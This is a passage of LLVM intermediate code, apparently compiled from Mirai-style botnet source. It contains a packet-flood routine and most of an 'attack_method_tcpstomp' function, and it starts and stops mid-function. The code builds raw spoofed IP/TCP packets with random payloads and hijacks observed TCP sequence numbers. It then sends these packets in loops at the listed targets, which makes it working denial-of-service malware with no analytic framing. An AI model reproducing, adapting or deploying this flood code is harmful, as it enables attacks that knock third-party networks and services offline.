  %136 = bitcast i8* %135 to i16*
  store i16 %134, i16* %136, align 4
  %137 = getelementptr inbounds i8, i8* %125, i64 8
  store i8 %14, i8* %137, align 4
  %138 = call zeroext i16 @htons(i16 zeroext 16384) #12
  %139 = getelementptr inbounds i8, i8* %125, i64 6
  %140 = bitcast i8* %139 to i16*
  store i16 %138, i16* %140, align 2
  %141 = getelementptr inbounds i8, i8* %125, i64 9
  store i8 6, i8* %141, align 1
  %142 = getelementptr inbounds i8, i8* %125, i64 12
  %143 = bitcast i8* %142 to i32*
  store i32 %39, i32* %143, align 4
  %144 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %126, i32 1
  %145 = load i32, i32* %144, align 4
  %146 = getelementptr inbounds i8, i8* %125, i64 16
  %147 = bitcast i8* %146 to i32*
  store i32 %145, i32* %147, align 4
  %148 = call zeroext i16 @htons(i16 zeroext %18) #12
  %149 = bitcast i8* %128 to i16*
  store i16 %148, i16* %149, align 4
  %150 = call zeroext i16 @htons(i16 zeroext %20) #12
  %151 = getelementptr inbounds i8, i8* %125, i64 22
  %152 = bitcast i8* %151 to i16*
  store i16 %150, i16* %152, align 2
  %153 = call zeroext i16 @htons(i16 zeroext %51) #12
  %154 = zext i16 %153 to i32
  %155 = getelementptr inbounds i8, i8* %125, i64 24
  %156 = bitcast i8* %155 to i32*
  store i32 %154, i32* %156, align 4
  %157 = getelementptr inbounds i8, i8* %125, i64 32
  %158 = bitcast i8* %157 to i16*
  store i16 %.135, i16* %158, align 4
  call void @rand_str(i8* nonnull %129, i32 %35)
  %159 = load i32, i32* %5, align 4
  %160 = add nsw i32 %159, 1
  store i32 %160, i32* %5, align 4
  %161 = icmp slt i32 %160, %46
  br i1 %161, label %.lr.ph129.split, label %.preheader.loopexit139

.loopexit.loopexit:                               ; preds = %201
  br label %.loopexit.backedge

.loopexit.loopexit138:                            ; preds = %259
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %47, label %.loopexit.backedge, label %.lr.ph

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit, %.loopexit.loopexit138
  br label %.loopexit

.lr.ph:                                           ; preds = %.loopexit
  br i1 %109, label %.lr.ph.split.us.preheader, label %.lr.ph.split.preheader

.lr.ph.split.preheader:                           ; preds = %.lr.ph
  br label %.lr.ph.split

.lr.ph.split.us.preheader:                        ; preds = %.lr.ph
  br label %.lr.ph.split.us

.lr.ph.split.us:                                  ; preds = %.lr.ph.split.us.preheader, %201
  %storemerge121128.us = phi i32 [ %220, %201 ], [ 0, %.lr.ph.split.us.preheader ]
  %162 = sext i32 %storemerge121128.us to i64
  %163 = getelementptr inbounds i8*, i8** %8, i64 %162
  %164 = load i8*, i8** %163, align 8
  %165 = bitcast i8* %164 to %struct.iphdr*
  %166 = getelementptr inbounds i8, i8* %164, i64 20
  %167 = getelementptr inbounds i8, i8* %164, i64 40
  %168 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %162, i32 2
  %169 = load i8, i8* %168, align 4
  %170 = icmp ult i8 %169, 32
  br i1 %170, label %171, label %178

; <label>:171:                                    ; preds = %.lr.ph.split.us
  %172 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %162, i32 1
  %173 = load i32, i32* %172, align 4
  %174 = call i32 @ntohl(i32 %173) #12
  %175 = call i32 @htonl(i32 %174) #12
  %176 = getelementptr inbounds i8, i8* %164, i64 16
  %177 = bitcast i8* %176 to i32*
  store i32 %175, i32* %177, align 4
  br label %178

; <label>:178:                                    ; preds = %.lr.ph.split.us, %171
  %179 = getelementptr inbounds i8, i8* %164, i64 12
  %180 = bitcast i8* %179 to i32*
  store i32 0, i32* %180, align 4
  br i1 %111, label %181, label %184

; <label>:181:                                    ; preds = %178
  %182 = getelementptr inbounds i8, i8* %164, i64 4
  %183 = bitcast i8* %182 to i16*
  store i16 0, i16* %183, align 4
  br label %184

; <label>:184:                                    ; preds = %181, %178
  br i1 %113, label %185, label %187

; <label>:185:                                    ; preds = %184
  %186 = bitcast i8* %166 to i16*
  store i16 0, i16* %186, align 4
  br label %187

; <label>:187:                                    ; preds = %185, %184
  br i1 %115, label %188, label %191

; <label>:188:                                    ; preds = %187
  %189 = getelementptr inbounds i8, i8* %164, i64 22
  %190 = bitcast i8* %189 to i16*
  store i16 0, i16* %190, align 2
  br label %191

; <label>:191:                                    ; preds = %188, %187
  br i1 %116, label %192, label %195

; <label>:192:                                    ; preds = %191
  %193 = getelementptr inbounds i8, i8* %164, i64 24
  %194 = bitcast i8* %193 to i32*
  store i32 0, i32* %194, align 4
  br label %195

; <label>:195:                                    ; preds = %192, %191
  br i1 %117, label %196, label %199

; <label>:196:                                    ; preds = %195
  %197 = getelementptr inbounds i8, i8* %164, i64 28
  %198 = bitcast i8* %197 to i32*
  store i32 0, i32* %198, align 4
  br label %199

; <label>:199:                                    ; preds = %196, %195
  br i1 %118, label %201, label %200

; <label>:200:                                    ; preds = %199
  call void @rand_str(i8* nonnull %167, i32 %35)
  %.pre132 = load i32, i32* %5, align 4
  br label %201

; <label>:201:                                    ; preds = %200, %199
  %202 = phi i32 [ %.pre132, %200 ], [ %storemerge121128.us, %199 ]
  %203 = getelementptr inbounds i8, i8* %164, i64 10
  %204 = bitcast i8* %203 to i16*
  store i16 0, i16* %204, align 2
  %205 = bitcast i8* %164 to i16*
  %206 = call zeroext i16 @checksum_generic(i16* %205, i32 20)
  store i16 %206, i16* %204, align 2
  %207 = getelementptr inbounds i8, i8* %164, i64 36
  %208 = bitcast i8* %207 to i16*
  store i16 0, i16* %208, align 4
  %209 = call zeroext i16 @htons(i16 zeroext %121) #12
  %210 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %165, i8* nonnull %166, i16 zeroext %209, i32 %122)
  store i16 %210, i16* %208, align 4
  %211 = getelementptr inbounds i8, i8* %164, i64 22
  %212 = bitcast i8* %211 to i16*
  %213 = load i16, i16* %212, align 2
  %214 = sext i32 %202 to i64
  %215 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %214, i32 0, i32 1
  store i16 %213, i16* %215, align 2
  %216 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %214, i32 0
  %217 = bitcast %struct.sockaddr_in* %216 to %struct.sockaddr*
  %218 = call i64 @sendto(i32 %40, i8* nonnull %164, i64 %123, i32 16384, %struct.sockaddr* %217, i32 16) #11
  %219 = load i32, i32* %5, align 4
  %220 = add nsw i32 %219, 1
  store i32 %220, i32* %5, align 4
  %221 = icmp slt i32 %220, %46
  br i1 %221, label %.lr.ph.split.us, label %.loopexit.loopexit

.lr.ph.split:                                     ; preds = %.lr.ph.split.preheader, %259
  %storemerge121128 = phi i32 [ %278, %259 ], [ 0, %.lr.ph.split.preheader ]
  %222 = sext i32 %storemerge121128 to i64
  %223 = getelementptr inbounds i8*, i8** %8, i64 %222
  %224 = load i8*, i8** %223, align 8
  %225 = bitcast i8* %224 to %struct.iphdr*
  %226 = getelementptr inbounds i8, i8* %224, i64 20
  %227 = getelementptr inbounds i8, i8* %224, i64 40
  %228 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %222, i32 2
  %229 = load i8, i8* %228, align 4
  %230 = icmp ult i8 %229, 32
  br i1 %230, label %231, label %238

; <label>:231:                                    ; preds = %.lr.ph.split
  %232 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %222, i32 1
  %233 = load i32, i32* %232, align 4
  %234 = call i32 @ntohl(i32 %233) #12
  %235 = call i32 @htonl(i32 %234) #12
  %236 = getelementptr inbounds i8, i8* %224, i64 16
  %237 = bitcast i8* %236 to i32*
  store i32 %235, i32* %237, align 4
  br label %238

; <label>:238:                                    ; preds = %.lr.ph.split, %231
  br i1 %111, label %239, label %242

; <label>:239:                                    ; preds = %238
  %240 = getelementptr inbounds i8, i8* %224, i64 4
  %241 = bitcast i8* %240 to i16*
  store i16 0, i16* %241, align 4
  br label %242

; <label>:242:                                    ; preds = %239, %238
  br i1 %113, label %243, label %245

; <label>:243:                                    ; preds = %242
  %244 = bitcast i8* %226 to i16*
  store i16 0, i16* %244, align 4
  br label %245

; <label>:245:                                    ; preds = %243, %242
  br i1 %115, label %246, label %249

; <label>:246:                                    ; preds = %245
  %247 = getelementptr inbounds i8, i8* %224, i64 22
  %248 = bitcast i8* %247 to i16*
  store i16 0, i16* %248, align 2
  br label %249

; <label>:249:                                    ; preds = %246, %245
  br i1 %116, label %250, label %253

; <label>:250:                                    ; preds = %249
  %251 = getelementptr inbounds i8, i8* %224, i64 24
  %252 = bitcast i8* %251 to i32*
  store i32 0, i32* %252, align 4
  br label %253

; <label>:253:                                    ; preds = %250, %249
  br i1 %117, label %254, label %257

; <label>:254:                                    ; preds = %253
  %255 = getelementptr inbounds i8, i8* %224, i64 28
  %256 = bitcast i8* %255 to i32*
  store i32 0, i32* %256, align 4
  br label %257

; <label>:257:                                    ; preds = %254, %253
  br i1 %118, label %259, label %258

; <label>:258:                                    ; preds = %257
  call void @rand_str(i8* %227, i32 %35)
  %.pre = load i32, i32* %5, align 4
  br label %259

; <label>:259:                                    ; preds = %257, %258
  %260 = phi i32 [ %storemerge121128, %257 ], [ %.pre, %258 ]
  %261 = getelementptr inbounds i8, i8* %224, i64 10
  %262 = bitcast i8* %261 to i16*
  store i16 0, i16* %262, align 2
  %263 = bitcast i8* %224 to i16*
  %264 = call zeroext i16 @checksum_generic(i16* %263, i32 20)
  store i16 %264, i16* %262, align 2
  %265 = getelementptr inbounds i8, i8* %224, i64 36
  %266 = bitcast i8* %265 to i16*
  store i16 0, i16* %266, align 4
  %267 = call zeroext i16 @htons(i16 zeroext %121) #12
  %268 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %225, i8* %226, i16 zeroext %267, i32 %122)
  store i16 %268, i16* %266, align 4
  %269 = getelementptr inbounds i8, i8* %224, i64 22
  %270 = bitcast i8* %269 to i16*
  %271 = load i16, i16* %270, align 2
  %272 = sext i32 %260 to i64
  %273 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %272, i32 0, i32 1
  store i16 %271, i16* %273, align 2
  %274 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %272, i32 0
  %275 = bitcast %struct.sockaddr_in* %274 to %struct.sockaddr*
  %276 = call i64 @sendto(i32 %40, i8* %224, i64 %123, i32 16384, %struct.sockaddr* %275, i32 16) #11
  %277 = load i32, i32* %5, align 4
  %278 = add nsw i32 %277, 1
  store i32 %278, i32* %5, align 4
  %279 = icmp slt i32 %278, %46
  br i1 %279, label %.lr.ph.split, label %.loopexit.loopexit138

; <label>:280:                                    ; preds = %4, %107
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpstomp(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca [256 x i8], align 16
  %10 = zext i8 %0 to i64
  %11 = tail call noalias i8* @calloc(i64 %10, i64 16) #11
  %12 = bitcast i8* %11 to %struct.attack_xmas_data*
  %13 = tail call noalias i8* @calloc(i64 %10, i64 8) #11
  %14 = bitcast i8* %13 to i8**
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %20 = trunc i32 %19 to i8
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 1)
  %22 = trunc i32 %21 to i8
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %24 = trunc i32 %23 to i16
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 11, i32 0)
  %26 = trunc i32 %25 to i16
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 12, i32 1)
  %28 = trunc i32 %27 to i16
  %29 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 13, i32 1)
  %30 = trunc i32 %29 to i16
  %31 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 14, i32 0)
  %32 = trunc i32 %31 to i16
  %33 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 15, i32 0)
  %34 = trunc i32 %33 to i16
  %35 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 16, i32 0)
  %36 = trunc i32 %35 to i16
  %37 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 768)
  %38 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %39 = trunc i32 %38 to i8
  %40 = tail call i32 @socket(i32 2, i32 3, i32 6) #11
  %41 = icmp eq i32 %40, -1
  br i1 %41, label %.loopexit150, label %42

; <label>:42:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %43 = bitcast i32* %5 to i8*
  %44 = call i32 @setsockopt(i32 %40, i32 0, i32 3, i8* nonnull %43, i32 4) #11
  %45 = icmp eq i32 %44, -1
  br i1 %45, label %82, label %.preheader153

.preheader153:                                    ; preds = %42
  store i32 0, i32* %5, align 4
  %46 = zext i8 %0 to i32
  %47 = icmp eq i8 %0, 0
  br i1 %47, label %.preheader153..preheader_crit_edge, label %.preheader151.lr.ph

.preheader153..preheader_crit_edge:               ; preds = %.preheader153
  %.pre175 = sext i32 %37 to i64
  %.pre176 = add nsw i64 %.pre175, 40
  br label %.preheader

.preheader151.lr.ph:                              ; preds = %.preheader153
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 0
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 2, i32 0
  %50 = and i32 %23, 65535
  %51 = icmp eq i32 %50, 65535
  %52 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 1
  %53 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %54 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 0
  %55 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %56 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 2, i32 0
  %57 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 20
  %58 = bitcast i8* %57 to i16*
  %59 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 32
  %60 = bitcast i8* %59 to i16*
  %61 = sext i32 %37 to i64
  %62 = add nsw i64 %61, 40
  %63 = trunc i64 %62 to i16
  %64 = icmp eq i8 %22, 0
  %65 = shl i16 %26, 13
  %66 = and i16 %65, 8192
  %67 = shl i16 %28, 12
  %68 = and i16 %67, 4096
  %69 = shl i16 %30, 11
  %70 = and i16 %69, 2048
  %71 = shl i16 %32, 10
  %72 = and i16 %71, 1024
  %73 = shl i16 %34, 9
  %74 = and i16 %73, 512
  %75 = shl i16 %36, 8
  %76 = and i16 %75, 256
  %77 = or i16 %68, %66
  %78 = or i16 %77, %70
  %79 = or i16 %78, %72
  %.masked = or i16 %79, %74
  %80 = or i16 %.masked, %76
  %81 = or i16 %80, 128
  br label %.preheader151

; <label>:82:                                     ; preds = %42
  %83 = call i32 @close(i32 %40) #11
  br label %.loopexit150

.preheader151:                                    ; preds = %.preheader151.lr.ph, %.loopexit152
  %.0162 = phi %struct.tcphdr* [ undef, %.preheader151.lr.ph ], [ %.1, %.loopexit152 ]
  %84 = call i32 @socket(i32 2, i32 1, i32 0) #11
  %85 = icmp eq i32 %84, -1
  br i1 %85, label %.loopexit152, label %.lr.ph161

.lr.ph161:                                        ; preds = %.preheader151
  br i1 %51, label %.lr.ph161.split.us.preheader, label %.lr.ph161.split.preheader

.lr.ph161.split.preheader:                        ; preds = %.lr.ph161
  br label %.lr.ph161.split

.lr.ph161.split.us.preheader:                     ; preds = %.lr.ph161
  br label %.lr.ph161.split.us

.lr.ph161.split.us:                               ; preds = %.lr.ph161.split.us.preheader, %.backedge.us
  %86 = phi i32 [ %133, %.backedge.us ], [ %84, %.lr.ph161.split.us.preheader ]
  %87 = call i32 (i32, i32, ...) @fcntl(i32 %86, i32 3, i32 0) #11
  %88 = or i32 %87, 2048
  %89 = call i32 (i32, i32, ...) @fcntl(i32 %86, i32 4, i32 %88) #11
  store i16 2, i16* %48, align 4
  %90 = load i32, i32* %5, align 4
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %91, i32 2
  %93 = load i8, i8* %92, align 4
  %94 = icmp ult i8 %93, 32
  %95 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %91, i32 1
  %96 = load i32, i32* %95, align 4
  br i1 %94, label %97, label %100

; <label>:97:                                     ; preds = %.lr.ph161.split.us
  %98 = call i32 @ntohl(i32 %96) #12
  %99 = call i32 @htonl(i32 %98) #12
  br label %100

; <label>:100:                                    ; preds = %97, %.lr.ph161.split.us
  %.sink.us = phi i32 [ %99, %97 ], [ %96, %.lr.ph161.split.us ]
  store i32 %.sink.us, i32* %49, align 4
  store i16 0, i16* %52, align 2
  %101 = call i32 @connect(i32 %86, %struct.sockaddr* nonnull %53, i32 16) #11
  %102 = call i64 @time(i64* null) #11
  br label %103

; <label>:103:                                    ; preds = %127, %100
  store i32 16, i32* %8, align 4
  %104 = call i64 @recvfrom(i32 %40, i8* nonnull %54, i64 256, i32 16384, %struct.sockaddr* nonnull %55, i32* nonnull %8) #11
  %105 = trunc i64 %104 to i32
  %106 = icmp eq i32 %105, -1
  br i1 %106, label %.loopexit150.loopexit, label %107

; <label>:107:                                    ; preds = %103
  %108 = load i32, i32* %56, align 4
  %109 = load i32, i32* %49, align 4
  %110 = icmp eq i32 %108, %109
  br i1 %110, label %111, label %127

; <label>:111:                                    ; preds = %107
  %sext.us = shl i64 %104, 32
  %112 = ashr exact i64 %sext.us, 32
  %113 = icmp ugt i64 %112, 40
  br i1 %113, label %114, label %127

; <label>:114:                                    ; preds = %111
  %115 = load i16, i16* %58, align 4
  %116 = load i16, i16* %52, align 2
  %117 = icmp eq i16 %115, %116
  br i1 %117, label %118, label %127

; <label>:118:                                    ; preds = %114
  %119 = load i16, i16* %60, align 16
  %120 = and i16 %119, 4608
  %121 = icmp eq i16 %120, 4608
  br i1 %121, label %.us-lcssa.us.loopexit, label %122

; <label>:122:                                    ; preds = %118
  %123 = and i16 %119, 1280
  %124 = icmp eq i16 %123, 0
  br i1 %124, label %127, label %125

; <label>:125:                                    ; preds = %122
  %126 = call i32 @close(i32 %86) #11
  br label %.backedge.us

; <label>:127:                                    ; preds = %122, %114, %111, %107
  %128 = call i64 @time(i64* null) #11
  %129 = sub nsw i64 %128, %102
  %130 = icmp sgt i64 %129, 10
  br i1 %130, label %131, label %103

; <label>:131:                                    ; preds = %127
  %132 = call i32 @close(i32 %86) #11
  br label %.backedge.us

.backedge.us:                                     ; preds = %131, %125
  %133 = call i32 @socket(i32 2, i32 1, i32 0) #11
  %134 = icmp eq i32 %133, -1
  br i1 %134, label %.loopexit152.loopexit, label %.lr.ph161.split.us

.preheader.loopexit:                              ; preds = %.loopexit152
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader153..preheader_crit_edge
  %.pre-phi177 = phi i64 [ %.pre176, %.preheader153..preheader_crit_edge ], [ %62, %.preheader.loopexit ]
  %.pre-phi = phi i64 [ %.pre175, %.preheader153..preheader_crit_edge ], [ %61, %.preheader.loopexit ]
  %135 = and i32 %17, 65535
  %136 = icmp eq i32 %135, 65535
  %137 = icmp eq i8 %39, 0
  %138 = add nsw i64 %.pre-phi, 20
  %139 = trunc i64 %138 to i16
  %140 = trunc i64 %138 to i32
  br label %.loopexit

.lr.ph161.split:                                  ; preds = %.lr.ph161.split.preheader, %.backedge
  %141 = phi i32 [ %235, %.backedge ], [ %84, %.lr.ph161.split.preheader ]
  %142 = call i32 (i32, i32, ...) @fcntl(i32 %141, i32 3, i32 0) #11
  %143 = or i32 %142, 2048
  %144 = call i32 (i32, i32, ...) @fcntl(i32 %141, i32 4, i32 %143) #11
  store i16 2, i16* %48, align 4
  %145 = load i32, i32* %5, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %146, i32 2
  %148 = load i8, i8* %147, align 4
  %149 = icmp ult i8 %148, 32
  %150 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %146, i32 1
  %151 = load i32, i32* %150, align 4
  br i1 %149, label %152, label %155

; <label>:152:                                    ; preds = %.lr.ph161.split
  %153 = call i32 @ntohl(i32 %151) #12
  %154 = call i32 @htonl(i32 %153) #12
  br label %155

; <label>:155:                                    ; preds = %.lr.ph161.split, %152
  %.sink = phi i32 [ %154, %152 ], [ %151, %.lr.ph161.split ]
  store i32 %.sink, i32* %49, align 4
  %156 = call zeroext i16 @htons(i16 zeroext %24) #12
  store i16 %156, i16* %52, align 2
  %157 = call i32 @connect(i32 %141, %struct.sockaddr* nonnull %53, i32 16) #11
  %158 = call i64 @time(i64* null) #11
  br label %159

; <label>:159:                                    ; preds = %237, %155
  store i32 16, i32* %8, align 4
  %160 = call i64 @recvfrom(i32 %40, i8* nonnull %54, i64 256, i32 16384, %struct.sockaddr* nonnull %55, i32* nonnull %8) #11
  %161 = trunc i64 %160 to i32
  %162 = icmp eq i32 %161, -1
  br i1 %162, label %.loopexit150.loopexit205, label %163

; <label>:163:                                    ; preds = %159
  %164 = load i32, i32* %56, align 4
  %165 = load i32, i32* %49, align 4
  %166 = icmp eq i32 %164, %165
  br i1 %166, label %167, label %237

; <label>:167:                                    ; preds = %163
  %sext = shl i64 %160, 32
  %168 = ashr exact i64 %sext, 32
  %169 = icmp ugt i64 %168, 40
  br i1 %169, label %170, label %237

; <label>:170:                                    ; preds = %167
  %171 = load i16, i16* %58, align 4
  %172 = load i16, i16* %52, align 2
  %173 = icmp eq i16 %171, %172
  br i1 %173, label %174, label %237

; <label>:174:                                    ; preds = %170
  %175 = load i16, i16* %60, align 16
  %176 = and i16 %175, 4608
  %177 = icmp eq i16 %176, 4608
  br i1 %177, label %.us-lcssa.us.loopexit206, label %230

.us-lcssa.us.loopexit:                            ; preds = %118
  br label %.us-lcssa.us

.us-lcssa.us.loopexit206:                         ; preds = %174
  br label %.us-lcssa.us

.us-lcssa.us:                                     ; preds = %.us-lcssa.us.loopexit206, %.us-lcssa.us.loopexit
  %178 = phi i16 [ %115, %.us-lcssa.us.loopexit ], [ %171, %.us-lcssa.us.loopexit206 ]
  %179 = phi i32 [ %108, %.us-lcssa.us.loopexit ], [ %164, %.us-lcssa.us.loopexit206 ]
  %180 = load i32, i32* %5, align 4
  %181 = sext i32 %180 to i64
  %182 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %12, i64 %181, i32 0
  store i32 %179, i32* %182, align 4
  %183 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %.0162, i64 0, i32 2
  %184 = load i32, i32* %183, align 4
  %185 = call i32 @ntohl(i32 %184) #12
  %186 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %12, i64 %181, i32 1
  store i32 %185, i32* %186, align 4
  %187 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %.0162, i64 0, i32 3
  %188 = load i32, i32* %187, align 4
  %189 = call i32 @ntohl(i32 %188) #12
  %190 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %12, i64 %181, i32 2
  store i32 %189, i32* %190, align 4
  %191 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %.0162, i64 0, i32 1
  %192 = load i16, i16* %191, align 2
  %193 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %12, i64 %181, i32 3
  store i16 %192, i16* %193, align 4
  %194 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %12, i64 %181, i32 4
  store i16 %178, i16* %194, align 2
  %195 = call noalias i8* @malloc(i64 %62) #11
  %196 = getelementptr inbounds i8*, i8** %14, i64 %181
  store i8* %195, i8** %196, align 8
  %197 = getelementptr inbounds i8, i8* %195, i64 20
  %198 = bitcast i8* %197 to %struct.tcphdr*
  %199 = getelementptr inbounds i8, i8* %195, i64 40
  store i8 69, i8* %195, align 4
  %200 = getelementptr inbounds i8, i8* %195, i64 1
  store i8 %16, i8* %200, align 1
  %201 = call zeroext i16 @htons(i16 zeroext %63) #12
  %202 = getelementptr inbounds i8, i8* %195, i64 2
  %203 = bitcast i8* %202 to i16*
  store i16 %201, i16* %203, align 2
  %204 = call zeroext i16 @htons(i16 zeroext %18) #12
  %205 = getelementptr inbounds i8, i8* %195, i64 4
  %206 = bitcast i8* %205 to i16*
  store i16 %204, i16* %206, align 4
  %207 = getelementptr inbounds i8, i8* %195, i64 8
  store i8 %20, i8* %207, align 4
  br i1 %64, label %212, label %208

; <label>:208:                                    ; preds = %.us-lcssa.us
  %209 = call zeroext i16 @htons(i16 zeroext 16384) #12
  %210 = getelementptr inbounds i8, i8* %195, i64 6
  %211 = bitcast i8* %210 to i16*
  store i16 %209, i16* %211, align 2
  br label %212

; <label>:212:                                    ; preds = %.us-lcssa.us, %208
  %213 = getelementptr inbounds i8, i8* %195, i64 9
  store i8 6, i8* %213, align 1
  %214 = load i32, i32* @LOCAL_ADDR, align 4
  %215 = getelementptr inbounds i8, i8* %195, i64 12
  %216 = bitcast i8* %215 to i32*
  store i32 %214, i32* %216, align 4
  %217 = getelementptr inbounds i8, i8* %195, i64 16
  %218 = bitcast i8* %217 to i32*
  store i32 %179, i32* %218, align 4
  %219 = bitcast i8* %197 to i16*
  store i16 %192, i16* %219, align 4
  %220 = getelementptr inbounds i8, i8* %195, i64 22
  %221 = bitcast i8* %220 to i16*
  store i16 %178, i16* %221, align 2
  %222 = getelementptr inbounds i8, i8* %195, i64 24
  %223 = bitcast i8* %222 to i32*
  store i32 %189, i32* %223, align 4
  %224 = getelementptr inbounds i8, i8* %195, i64 28
  %225 = bitcast i8* %224 to i32*
  store i32 %185, i32* %225, align 4
  %226 = getelementptr inbounds i8, i8* %195, i64 32
  %227 = bitcast i8* %226 to i16*
  %228 = getelementptr inbounds i8, i8* %195, i64 34
  %229 = bitcast i8* %228 to i16*
  store i16 0, i16* %229, align 2
  store i16 %81, i16* %227, align 4
  call void @rand_str(i8* %199, i32 %37)
  br label %.loopexit152

; <label>:230:                                    ; preds = %174
  %231 = and i16 %175, 1280
  %232 = icmp eq i16 %231, 0
  br i1 %232, label %237, label %233

; <label>:233:                                    ; preds = %230
  %234 = call i32 @close(i32 %141) #11
  br label %.backedge

.backedge:                                        ; preds = %233, %241
  %235 = call i32 @socket(i32 2, i32 1, i32 0) #11
  %236 = icmp eq i32 %235, -1
  br i1 %236, label %.loopexit152.loopexit207, label %.lr.ph161.split

; <label>:237:                                    ; preds = %230, %170, %167, %163
  %238 = call i64 @time(i64* null) #11
  %239 = sub nsw i64 %238, %158
  %240 = icmp sgt i64 %239, 10
  br i1 %240, label %241, label %159

; <label>:241:                                    ; preds = %237
  %242 = call i32 @close(i32 %141) #11
  br label %.backedge

.loopexit152.loopexit:                            ; preds = %.backedge.us
  br label %.loopexit152

.loopexit152.loopexit207:                         ; preds = %.backedge
  br label %.loopexit152

.loopexit152:                                     ; preds = %.loopexit152.loopexit207, %.loopexit152.loopexit, %.preheader151, %212
  %.1 = phi %struct.tcphdr* [ %198, %212 ], [ %.0162, %.preheader151 ], [ %.0162, %.loopexit152.loopexit ], [ %.0162, %.loopexit152.loopexit207 ]
  %243 = load i32, i32* %5, align 4
  %244 = add nsw i32 %243, 1
  store i32 %244, i32* %5, align 4
  %245 = icmp slt i32 %244, %46
  br i1 %245, label %.preheader151, label %.preheader.loopexit

.loopexit.loopexit:                               ; preds = %255
  br label %.loopexit.backedge

.loopexit.loopexit204:                            ; preds = %298
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %47, label %.loopexit.backedge, label %.lr.ph

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit, %.loopexit.loopexit204
  br label %.loopexit

.lr.ph:                                           ; preds = %.loopexit
  br i1 %136, label %.lr.ph.split.us.preheader, label %.lr.ph.split.preheader

.lr.ph.split.preheader:                           ; preds = %.lr.ph
  br label %.lr.ph.split

.lr.ph.split.us.preheader:                        ; preds = %.lr.ph
  br label %.lr.ph.split.us

.lr.ph.split.us:                                  ; preds = %.lr.ph.split.us.preheader, %255
  %storemerge139160.us = phi i32 [ %289, %255 ], [ 0, %.lr.ph.split.us.preheader ]
  %246 = sext i32 %storemerge139160.us to i64
  %247 = getelementptr inbounds i8*, i8** %14, i64 %246
  %248 = load i8*, i8** %247, align 8
  %249 = bitcast i8* %248 to %struct.iphdr*
  %250 = getelementptr inbounds i8, i8* %248, i64 20
  %251 = getelementptr inbounds i8, i8* %248, i64 4
